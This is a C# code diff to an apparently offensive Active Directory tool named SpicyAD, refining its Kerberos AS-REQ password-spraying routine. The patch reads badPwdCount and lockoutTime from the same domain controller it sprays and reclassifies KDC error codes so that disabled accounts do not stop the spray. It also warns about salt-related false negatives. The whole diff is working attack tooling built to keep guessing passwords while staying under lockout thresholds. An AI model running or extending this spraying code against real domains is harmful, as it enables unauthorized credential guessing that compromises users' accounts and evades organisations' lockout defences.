@@ -520,10 +520,20 @@ namespace SpicyAD
                     return;
                 }
 
+                // Resolve the KDC up-front: every badPwdCount read AND the AS-REQ must target
+                // the same DC, because badPwdCount is not replicated between DCs.
+                string kdcHost = GetKdcHost();
+                if (string.IsNullOrEmpty(kdcHost))
+                {
+                    Console.WriteLine("[!] Could not determine KDC host.");
+                    return;
+                }
+                Console.WriteLine($"[+] Using KDC: {kdcHost}\n");
+
                 // Step 3: Check current badPwdCount status for all users
                 Console.WriteLine("[*] Step 3: Checking badPwdCount for all users (fresh query)...\n");
 
-                var userBadPwdCount = GetAllUsersBadPwdCount();
+                var userBadPwdCount = GetAllUsersBadPwdCount(kdcHost);
 
                 int safeCount = 0;
                 int riskyCount = 0;
@@ -585,22 +595,15 @@ namespace SpicyAD
                 // Step 4: Perform the spray with real-time badPwdCount checking
                 Console.WriteLine($"\n[*] Step 4: Spraying via Kerberos AS-REQ...\n");
 
-                string kdcHost = GetKdcHost();
-                if (string.IsNullOrEmpty(kdcHost))
-                {
-                    Console.WriteLine("[!] Could not determine KDC host.");
-                    return;
-                }
-                Console.WriteLine($"[+] Using KDC: {kdcHost}\n");
-
                 List<string> validCredentials = new List<string>();
                 int testedCount = 0;
                 int skippedCount = 0;
 
                 foreach (string username in allUsers)
                 {
-                    // IMPORTANT: Check badPwdCount FRESH before EACH attempt
-                    int currentBadPwd = GetUserBadPwdCount(username);
+                    // IMPORTANT: Check badPwdCount FRESH before EACH attempt, on the SAME DC
+                    // we will send the AS-REQ to (badPwdCount is not replicated).
+                    int currentBadPwd = GetUserBadPwdCount(username, kdcHost);
 
                     if (currentBadPwd >= safeThreshold)
                     {
@@ -637,17 +640,26 @@ namespace SpicyAD
                             break;
 
                         case KerberosAuthResult.AccountLocked:
-                            Console.ForegroundColor = ConsoleColor.Red;
-                            Console.WriteLine($"[!] {username}: Account LOCKED OUT - stopping spray!");
-                            Console.WriteLine("[!] Spray aborted to prevent further lockouts.");
-                            Console.ResetColor();
-                            goto EndSpray;
+                            // KDC_ERR_CLIENT_REVOKED (18) is overloaded by AD for disabled,
+                            // expired AND locked-out accounts. Disambiguate against lockoutTime
+                            // on the SAME DC we sprayed so we only abort on a genuine lockout
+                            // (a merely-disabled account must not stop the whole spray).
+                            if (IsAccountLockedOut(kdcHost, username))
+                            {
+                                Console.ForegroundColor = ConsoleColor.Red;
+                                Console.WriteLine($"[!] {username}: Account LOCKED OUT - stopping spray!");
+                                Console.WriteLine("[!] Spray aborted to prevent further lockouts.");
+                                Console.ResetColor();
+                                goto EndSpray;
+                            }
+                            OutputHelper.Verbose($"[-] {username}: Account disabled/revoked (not locked) - skipping");
+                            break;
 
                         case KerberosAuthResult.InvalidCredentials:
                         case KerberosAuthResult.PreAuthRequired:
                             OutputHelper.Verbose($"[-] {username}: Invalid password");
-                            // Check if badPwdCount increased after failed attempt
-                            int newBadPwd = GetUserBadPwdCount(username);
+                            // Check if badPwdCount increased after failed attempt (same DC)
+                            int newBadPwd = GetUserBadPwdCount(username, kdcHost);
                             if (newBadPwd > currentBadPwd)
                             {
                                 OutputHelper.Verbose($"[*] {username}: badPwdCount increased {currentBadPwd} -> {newBadPwd}");
@@ -728,6 +740,15 @@ namespace SpicyAD
                 if (info != null)
                 {
                     OutputHelper.Verbose($"[*] {username}: KDC etype={info.Etype} salt={(info.Salt ?? "<default>")} iter={(info.Iterations?.ToString() ?? "4096")}");
+                }
+                else
+                {
+                    // No PA-ETYPE-INFO2 came back. We fall back to AES256 with a guessed
+                    // (REALM+principal) salt. For AES-only accounts whose salt differs from the
+                    // default (renamed principals, custom UPNs) this yields PREAUTH_FAILED, i.e.
+                    // a FALSE "invalid password" rather than a real failure. Surface it so the
+                    // operator doesn't mistake it for a wrong credential.
+                    OutputHelper.Verbose($"[!] {username}: KDC returned no ETYPE-INFO2; falling back to AES256 + default salt (result may be a false negative)");
                 }
 
                 // Build AS-REQ with PA-ENC-TIMESTAMP (pre-authentication) using the real params
@@ -1303,16 +1324,21 @@ namespace SpicyAD
                         {
                             case 6:  // KDC_ERR_C_PRINCIPAL_UNKNOWN
                                 return KerberosAuthResult.InvalidCredentials;
-                            case 18: // KDC_ERR_CLIENT_REVOKED (disabled)
-                                return KerberosAuthResult.AccountDisabled;
+                            case 18: // KDC_ERR_CLIENT_REVOKED
+                                // AD overloads this for disabled, expired, AND locked-out
+                                // accounts. The lockout bit must be disambiguated by the caller
+                                // via badPwdCount/lockoutTime; treat it as a lockout signal so
+                                // the spray can stop rather than silently continuing.
+                                return KerberosAuthResult.AccountLocked;
                             case 23: // KDC_ERR_KEY_EXPIRED (password expired)
                                 return KerberosAuthResult.PasswordExpired;
-                            case 24: // KDC_ERR_PREAUTH_FAILED
+                            case 24: // KDC_ERR_PREAUTH_FAILED (wrong password)
                                 return KerberosAuthResult.InvalidCredentials;
                             case 25: // KDC_ERR_PREAUTH_REQUIRED
                                 return KerberosAuthResult.PreAuthRequired;
-                            case 37: // KDC_ERR_CLIENT_NOT_TRUSTED (locked)
-                                return KerberosAuthResult.AccountLocked;
+                            case 37: // KRB_AP_ERR_SKEW (clock skew) - not a lockout
+                                OutputHelper.Verbose("[!] Clock skew (KRB_AP_ERR_SKEW) - check time sync with KDC");
+                                return KerberosAuthResult.Error;
                             default:
                                 OutputHelper.Verbose($"[*] KRB error code: {errorCode}");
                                 return KerberosAuthResult.Error;
@@ -1372,12 +1398,27 @@ namespace SpicyAD
         }
 
         
-        /// Get badPwdCount for a single user (fresh query, no cache)
-        private static int GetUserBadPwdCount(string username)
+        /// <summary>
+        /// Bind a DirectoryEntry against a SPECIFIC DC. badPwdCount is a non-replicated
+        /// attribute (it lives only on the DC that processed the failed logon), so the safety
+        /// check MUST query the same DC we send the AS-REQ to. Binding through the generic
+        /// AuthContext entry can land on a different DC (DNS round-robin) and read a stale
+        /// count, defeating the lockout protection.
+        /// </summary>
+        private static DirectoryEntry GetDirectoryEntryForDc(string server)
+        {
+            if (string.IsNullOrEmpty(server))
+                return AuthContext.GetDirectoryEntry();
+            return AuthContext.GetDirectoryEntry($"LDAP://{server}");
+        }
+
+        /// Get badPwdCount for a single user (fresh query, no cache) from a specific DC.
+        /// Pass the same host used for the AS-REQ so the count is authoritative.
+        private static int GetUserBadPwdCount(string username, string server = null)
         {
             try
             {
-                DirectoryEntry de = AuthContext.GetDirectoryEntry();
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
                 DirectorySearcher searcher = new DirectorySearcher(de);
                 searcher.Filter = $"(&(objectClass=user)(samAccountName={username}))";
                 searcher.PropertiesToLoad.Add("badPwdCount");
@@ -1397,15 +1438,47 @@ namespace SpicyAD
             return 0;
         }
 
+        /// <summary>
+        /// Confirm whether an account is genuinely locked out (vs merely disabled/expired,
+        /// which AD also reports as KDC_ERR_CLIENT_REVOKED). Checks lockoutTime on the SAME DC
+        /// the spray hit; a non-zero lockoutTime means locked. Defaults to false on any error so
+        /// a transient lookup failure doesn't abort the whole spray.
+        /// </summary>
+        private static bool IsAccountLockedOut(string server, string username)
+        {
+            try
+            {
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
+                DirectorySearcher searcher = new DirectorySearcher(de);
+                searcher.Filter = $"(&(objectClass=user)(samAccountName={username}))";
+                searcher.PropertiesToLoad.Add("lockoutTime");
+                searcher.CacheResults = false;
+
+                SearchResult result = searcher.FindOne();
+                if (result != null && result.Properties.Contains("lockoutTime") && result.Properties["lockoutTime"].Count > 0)
+                {
+                    long lockoutTime = Convert.ToInt64(result.Properties["lockoutTime"][0]);
+                    // lockoutTime == 0 means never/cleared; non-zero means currently locked.
+                    return lockoutTime != 0;
+                }
+            }
+            catch (Exception ex)
+            {
+                OutputHelper.Verbose($"[!] Error checking lockoutTime for {username}: {ex.Message}");
+            }
+
+            return false;
+        }
+
         
-        /// Get badPwdCount for all users (batch query for initial check)
-        private static Dictionary<string, int> GetAllUsersBadPwdCount()
+        /// Get badPwdCount for all users (batch query for initial check) from a specific DC.
+        private static Dictionary<string, int> GetAllUsersBadPwdCount(string server = null)
         {
             var result = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);
 
             try
             {
-                DirectoryEntry de = AuthContext.GetDirectoryEntry();
+                DirectoryEntry de = GetDirectoryEntryForDc(server);
                 DirectorySearcher searcher = new DirectorySearcher(de);
                 searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                 searcher.PropertiesToLoad.Add("samAccountName");
